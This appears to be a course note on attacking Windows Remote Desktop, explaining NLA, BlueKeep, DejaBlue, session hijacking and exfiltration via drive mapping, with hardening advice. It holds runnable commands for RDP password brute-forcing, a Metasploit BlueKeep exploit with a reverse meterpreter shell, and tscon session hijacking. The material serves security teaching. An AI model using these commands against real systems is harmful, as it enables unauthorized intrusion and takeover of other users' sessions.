---
tags: [rdp, bluekeep, dejablue, brute-force, windows, protocol-attack]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.09 RDP"
---

# Remote Desktop Protocol (RDP) Attacks

The Remote Desktop Protocol (RDP), operating over TCP port 3389 (and optionally UDP for performance), is a proprietary protocol developed by Microsoft. It provides a graphical interface to connect to another computer over a network connection. Given its widespread use for remote administration and work-from-home setups, it is a primary target for attackers ranging from script kiddies to Advanced Persistent Threats (APTs) and ransomware cartels.

## Architecture and Protocol Flow

RDP operates across multiple layers, heavily relying on the T.120 family of protocols (specifically T.128, T.125). Modern RDP connections typically involve a complex negotiation phase where security protocols are agreed upon.

### The RDP Handshake and Security Negotiation
When a client connects, the session begins with the **Connection Initiation** phase, where the client sends an `X.224 Connection Request`. The server replies with a `Connection Confirm`, alongside the chosen security protocol (e.g., Standard RDP Security, TLS, or CredSSP).

**Network Level Authentication (NLA):**
Historically, an RDP session would launch the Windows login GUI *before* authenticating the user. This allowed attackers to interact with the graphics subsystem and initiate resource-heavy sessions without credentials, leading to DoS and pre-auth exploits.
NLA forces the client to present valid credentials (via CredSSP using Kerberos or NTLM) *before* an RDP session is established. NLA is the primary defense against many modern RDP vulnerabilities.

---

## Attack Surface Overview

```ascii
+----------------+                            +--------------------------+
|                |    TCP/3389 SYN            |                          |
|   Attacker     |--------------------------->|    Windows Server        |
|                |                            |    (RDP Service)         |
| Tools:         |    Connection Request      |                          |
| - Hydra        |--------------------------->|    NLA Enabled?          |
| - Crowbar      |                            |    - YES: Needs Creds    |
| - Metasploit   |<--- X.224 Confirm ---------|    - NO: Pre-Auth Attack |
|   (BlueKeep)   |                            |                          |
|                |    Exploit Payload /       |    Vulnerable channels:  |
|                |    Brute Force Attempt     |    MS_T120 (BlueKeep)    |
|                |===========================>|    rdpdr, rdpsnd         |
+----------------+                            +--------------------------+
```

---

## 1. Brute-Force and Credential Stuffing

Despite advanced exploits, the most common way RDP is breached is through weak credentials. If RDP is exposed directly to the internet (a massive security failure), it is subjected to constant, automated brute-force attacks.

### Exploitation Mechanics
Tools like `hydra`, `ncrack`, or `crowbar` are used to spray passwords against the RDP service. `crowbar` is often preferred because it interacts well with NLA and handles RDP sessions more cleanly than legacy brute-forcers.

```bash
# Using Crowbar for RDP brute-forcing
crowbar -b rdp -U users.txt -c Password123 -s 10.10.10.150/32

# Using Hydra
hydra -L users.txt -P passwords.txt rdp://10.10.10.150
```

### Password Spraying
Instead of targeting one user with many passwords (which locks the account), attackers use one common password (e.g., `Summer2026!`) against hundreds of usernames to bypass account lockout policies.

---

## 2. BlueKeep (CVE-2019-0708)

BlueKeep is a devastating, wormable, pre-authentication remote code execution (RCE) vulnerability in the Windows Remote Desktop Services (RDS). It affected older operating systems: Windows 7, Windows Server 2008 R2, and Windows XP.

### Technical Deep Dive into BlueKeep
The vulnerability resides in the way the `termdd.sys` (Terminal Device Driver) handles the binding of internal RDP channels.
During an RDP connection, virtual channels are created to handle different data streams (e.g., clipboard, audio, drive redirection). The channel named `MS_T120` is a highly privileged, internal-only channel used by the Microsoft RDP stack.

1. **The Flaw**: A client is not supposed to be able to explicitly bind to the `MS_T120` channel. However, due to improper state validation, an attacker could request a binding to `MS_T120` during the initial X.224 connection setup.
2. **The Exploit**: By binding to `MS_T120` and subsequently sending malformed data, an attacker can cause a Use-After-Free (UAF) condition in `termdd.sys` in kernel memory.
3. **Execution**: The UAF allows the attacker to overwrite a kernel object, seize execution flow, and run arbitrary shellcode with `NT AUTHORITY\SYSTEM` privileges.
4. **Wormability**: Because this happens *before* authentication (if NLA is disabled), malware can scan the internet, exploit the flaw, install itself, and continue scanning, exactly like WannaCry.

### Metasploit Exploitation
Exploiting BlueKeep manually requires precise kernel memory grooming (Heap Feng Shui). Metasploit automates this, though it is highly prone to crashing the target (causing a Blue Screen of Death - BSOD) if the exact OS build architecture isn't matched.

```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.50
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
# The target architecture must be set correctly to avoid BSOD
set target 2 
exploit
```

---

## 3. DejaBlue (CVE-2019-1181 / CVE-2019-1182)

Following the discovery of BlueKeep, Microsoft audited the RDS code and found similar wormable, pre-auth RCE vulnerabilities dubbed "DejaBlue".

### Technical Distinctions
- **Affected Systems**: Unlike BlueKeep, DejaBlue affected newer operating systems, including Windows 8.1, Windows 10, and Windows Server 2012/2016/2019.
- **The Mechanism**: These flaws were integer overflows in the base RDP display drivers and handling of decompression, rather than kernel-level UAFs in channel binding.
- **Impact**: Just like BlueKeep, successful exploitation yields `SYSTEM` level access pre-authentication (if NLA is bypassed or disabled).

---

## 4. Other RDP Attack Vectors

### RDP Session Hijacking
If an attacker gains administrative access to a Windows server, they can hijack disconnected RDP sessions belonging to other users (even higher privileged ones like Domain Admins) without knowing their passwords. This is done using the built-in `tscon.exe` utility, executed as SYSTEM.

```bat
# Find disconnected sessions
query user

# Hijack session ID 3 and attach it to our current session (console)
tscon 3 /dest:console
```

### RDP Downgrade Attacks
Attackers capable of intercepting traffic (MitM) can manipulate the negotiation phase to force the RDP connection to drop to weaker encryption or strip NLA entirely, exposing the connection to subsequent credential capture or pre-auth exploits.

### RDP as a Data Exfiltration Channel
RDP supports "drive mapping" where the client's local C:\ drive is mapped into the remote server session. Attackers use this to silently exfiltrate data from the server back to their attacking machine through the encrypted RDP tunnel, which often bypasses traditional network DLP (Data Loss Prevention) solutions.

---

## Defensive Countermeasures & Hardening

1. **Enforce Network Level Authentication (NLA)**: NLA mitigates almost all pre-auth exploits like BlueKeep by requiring the attacker to have valid credentials *before* the vulnerable RDS stack processes the connection.
2. **Never Expose RDP to the Internet**: Port 3389 should be blocked at the perimeter firewall. Remote access should be brokered through a VPN, an RD Gateway, or an Identity-Aware Proxy (IAP) with MFA enforced.
3. **Account Lockout Policies**: Implement strict account lockout thresholds to immediately halt brute-force and password-spraying attacks.
4. **Patch Management**: Critical patches for `termdd.sys` and related RDS components must be applied immediately to prevent wormable exploits.
5. **Restrict User Access**: Only users who absolutely require remote access should be in the `Remote Desktop Users` group.

---

## Chaining Opportunities

- **RDP -> Privilege Escalation**: Once an RDP session is established via a low-privileged user, attackers can utilize local enumeration tools to find misconfigured services or unpatched local exploits to elevate to SYSTEM.
- **RDP -> Lateral Movement**: Compromising an RDP server often provides a staging ground. From an RDP session, an attacker is "inside" the network, allowing them to run BloodHound, port scanners, and SMB relays directly from the compromised host.
- **Phishing -> RDP**: Phishing emails can deliver `.rdp` shortcut files that map the victim's local drives to an attacker-controlled RDP server, silently stealing NTLM hashes or dropping malware onto the victim's mapped C:\ drive.

## Related Notes
- [[13 - Kerberos — Pass-the-Hash, Pass-the-Ticket, Golden-Silver Ticket, Kerberoasting, AS-REP Roasting]]
- [[10 - SMB — EternalBlue, Null Session, Relay Attacks]]
- [[02 - Active Directory Architecture and Trust Relationships]]
- [[07 - Password Attacks and Hash Cracking]]
